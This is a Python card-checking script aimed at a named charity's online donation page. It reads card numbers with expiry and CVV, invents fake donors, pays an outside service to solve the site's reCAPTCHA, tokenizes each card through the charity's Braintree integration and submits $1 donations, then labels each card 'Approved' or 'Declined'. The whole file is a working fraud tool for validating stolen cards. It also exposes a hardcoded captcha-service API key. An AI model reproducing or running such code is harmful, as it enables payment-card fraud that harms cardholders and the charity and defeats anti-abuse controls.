import requests
import re
import base64
import json
import names
import random
from fake_useragent import UserAgent
import time
import uuid

def paserX(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

# CaptchaAI Configuration (Verified with OCR Endpoints)
CAPTCHAAI_KEY = 'okrzovimon1mv5kkiviljc5ml9dok0cw'

def solve_captcha(site_key, site_url):
    try:
        in_url = "https://ocr.captchaai.com/in.php"
        data = {
            "key": CAPTCHAAI_KEY,
            "method": "userrecaptcha",
            "googlekey": site_key,
            "pageurl": site_url,
            "json": 1
        }
        res = requests.post(in_url, data=data, timeout=30)
        resp = res.json()
        if resp.get("status") != 1:
            return None
        
        request_id = resp.get("request")
        res_url = "https://ocr.captchaai.com/res.php"
        for _ in range(30):
            time.sleep(5)
            params = {"key": CAPTCHAAI_KEY, "action": "get", "id": request_id, "json": 1}
            res = requests.get(res_url, params=params, timeout=30)
            resp = res.json()
            if resp.get("status") == 1:
                return resp.get("request")
            if resp.get("request") == "ERROR_CAPTCHA_UNSOLVABLE":
                return None
    except:
        return None
    return None

class sdcorps_checker:
    def __init__(self, card_str):
        self.card_str = card_str
        parts = card_str.split('|')
        self.cc = parts[0] if len(parts) > 0 else ""
        self.mes = parts[1] if len(parts) > 1 else ""
        self.ano = parts[2] if len(parts) > 2 else ""
        self.cvv = parts[3] if len(parts) > 3 else ""

    def main(self):
        try:
            session = requests.session()
            ua = UserAgent().random
            first_name = names.get_first_name()
            last_name = names.get_last_name()
            email = f"{first_name.lower()}{last_name.lower()}{random.randint(100,999)}@gmail.com"
            
            headers = {
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            }

            # 1. Visit the campaign page to get nonce and session
            resp = session.get('https://sdcorps.org/campaigns/support/', headers=headers, timeout=30).text
            
            # Extract Charitable nonces and form IDs
            form_id = paserX(resp, 'name="charitable_form_id" value="', '"')
            donation_nonce = paserX(resp, 'name="_charitable_donation_nonce" value="', '"')
            
            # 2. Get Braintree Client Token
            # Usually found in JS config on the page
            token_match = re.search(r'"client_token":"([^"]+)"', resp)
            if not token_match:
                token_match = re.search(r"authorization:\s*'([^']+)'", resp)
            
            if not token_match:
                # Sometimes it's in a script tag as a base64 string
                token_match = re.search(r'clientToken\s*:\s*"([^"]+)"', resp)

            if not token_match:
                return "Error", "Braintree client token not found"
            
            token = token_match.group(1)
            try:
                decode = base64.b64decode(token).decode("utf-8")
                bearer = json.loads(decode).get('authorizationFingerprint')
            except:
                bearer = token

            # 3. Solve Captcha
            # Site key found in user's network tap or page source
            # Based on common patterns for this site/plugin
            site_key = paserX(resp, 'data-sitekey="', '"') or "6Le8uk8UAAAAAKmSdQU9NjX37lzlRdkZVvaa43nY"
            cap = solve_captcha(site_key, 'https://sdcorps.org/campaigns/support/')
            if not cap:
                return "Error", "Captcha bypass failed"

            # 4. Braintree Tokenize
            bt_headers = {
                'authorization': f'Bearer {bearer}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'user-agent': ua,
            }
            bt_payload = {
                "input": {
                    "creditCard": {
                        "number": self.cc,
                        "expirationMonth": self.mes,
                        "expirationYear": self.ano,
                        "cvv": self.cvv
                    },
                    "options": {"validate": False}
                }
            }
            bt_res = session.post('https://payments.braintree-api.com/graphql', 
                                 headers=bt_headers, 
                                 json={"query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }", "variables": bt_payload}, 
                                 timeout=30).json()
            
            nonce = bt_res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
            if not nonce:
                return "Error", f"Braintree Tokenization Failed: {json.dumps(bt_res)}"

            # 5. Submit Donation (Final Request)
            ajax_headers = {
                'user-agent': ua,
                'x-requested-with': 'XMLHttpRequest',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'referer': 'https://sdcorps.org/campaigns/support/',
            }
            
            # Payload from user's network tap
            post_data = {
                'charitable_form_id': form_id,
                '_charitable_donation_nonce': donation_nonce,
                '_wp_http_referer': '/campaigns/support/',
                'campaign_id': '2583',
                'description': 'Support',
                'ID': '0',
                'gateway': 'braintree',
                'donation_amount': 'custom',
                'custom_donation_amount': '1.00',
                'first_name': first_name,
                'last_name': last_name,
                'email': email,
                'address': '123 Main St',
                'city': 'New York',
                'state': 'NY',
                'postcode': '10001',
                'country': 'US',
                'phone': '2125551234',
                'charitable_spamblocker_math_field': '6', # This might be dynamic, but often fixed per session
                'braintree_nonce': nonce,
                'g-recaptcha-response': cap,
                'charitable_grecaptcha_token': cap,
                'action': 'charitable_process_donation' # Common for this plugin
            }
            
            final_resp = session.post('https://sdcorps.org/wp-admin/admin-ajax.php', 
                                     headers=ajax_headers, 
                                     data=post_data, 
                                     timeout=30).json()
            
            if final_resp.get('success'):
                return "Approved! ✅", "Transaction Successful"
            else:
                msg = final_resp.get('data', {}).get('errors', [{}])[0].get('message', 'Declined')
                return "Declined! ❌", msg

        except Exception as e:
            return "Error", str(e)
